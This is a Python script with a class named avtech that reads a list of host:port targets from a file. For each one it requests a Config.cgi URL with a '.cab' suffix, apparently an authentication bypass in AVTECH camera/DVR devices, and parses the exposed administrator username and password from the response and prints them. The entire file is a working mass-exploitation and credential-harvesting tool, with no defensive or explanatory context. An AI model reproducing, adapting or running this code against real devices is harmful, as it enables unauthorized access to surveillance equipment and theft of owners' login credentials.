import re , os , sys , requests
class avtech:

    def avtechExploit(self):
        path = os.path.abspath(os.path.dirname(sys.argv[0]))
        vulnerable_host = open(path + '/Host/up_host.txt', 'r').read().splitlines()
        pattern_1 = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
        pattern_2 = r'(\:).*'
        a = 0
        while a < len(vulnerable_host):
            try:
                res = vulnerable_host[a]
                match1 = re.search(pattern_1, res)
                match2 = re.search(pattern_2, res)
                target_host = match1.group()
                port_raw = match2.group()
                port = port_raw[1:]
                url = 'http://' + target_host + ':'+ port + '/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*'
                response = requests.get(url)
                if response.status_code == 200:
                    patternUsername = 'Account.User1.Username='
                    patternPassword = 'Account.User1.Password='
                    generalMatch = 'nAccount'
                    ma = '\n'
                    userMatch = str(response.content)
                    passMatch = str(response.content)
                    passRaw = passMatch.partition(patternPassword)[2]
                    user = userMatch.partition(patternUsername)[2]
                    username = user.partition(generalMatch)
                    username = username[0]
                    username = username.replace(username[-1], '')
                    password = passRaw.partition(generalMatch)
                    password = password[0]
                    password = password.replace(password[-1], '')
                    print('[-]Found http://' + target_host + ':'+ port + ' With credentials '+ username+ ' : '+ password)
                elif response.status_code == 401:
                    pass
            except requests.exceptions.ConnectionError:
                pass
            except IndexError:
                pass
            except AttributeError:
                pass
            a += 1